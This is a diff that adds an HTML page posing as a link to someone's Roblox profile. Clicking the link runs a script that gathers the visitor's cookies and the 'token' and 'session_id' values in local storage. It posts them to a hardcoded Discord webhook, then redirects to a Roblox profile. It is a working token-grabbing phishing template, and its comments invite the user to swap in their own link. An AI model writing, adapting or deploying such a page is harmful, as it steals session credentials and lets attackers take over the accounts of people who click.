@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Profile</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        a {
+            text-decoration: none;
+            color: #0f0;
+            font-size: 24px;
+            display: block;
+            text-align: center;
+            margin-top: 40px;
+        }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <a href="#" onclick="logDiscord()">Click Here to View My Roblox Profile</a>
+    <p id="status"></p>
+
+    <script>
+        function logDiscord() {
+            // Get all cookies
+            const cookies = document.cookie.split(';').map(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                return `${name}=${value}`;
+            }).join('\n');
+
+            // Get token and session from local storage
+            const token = localStorage.getItem('token');
+            const session = localStorage.getItem('session_id');
+
+            // Combine everything
+            const data = `Cookies:\n${cookies}\n\nToken:\n${token}\n\nSession ID:\n${session}`;
+
+            // Send data to your webhook
+            fetch('https://discord.com/api/webhooks/1485120443441746175/yI1aD5CMlbmrQ232trPQHR16IzGULk8AZTx3RHd8o4Ro_MV38eivs9k3iDu36PdzvuKZ', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ message: data })
+            });
+
+            // Simulate loading and redirect to Roblox
+            document.getElementById('status').innerText = '✅ Discord token and cookies logged!';
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/users/1947831653/profile'; // Replace with your Roblox profile link
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
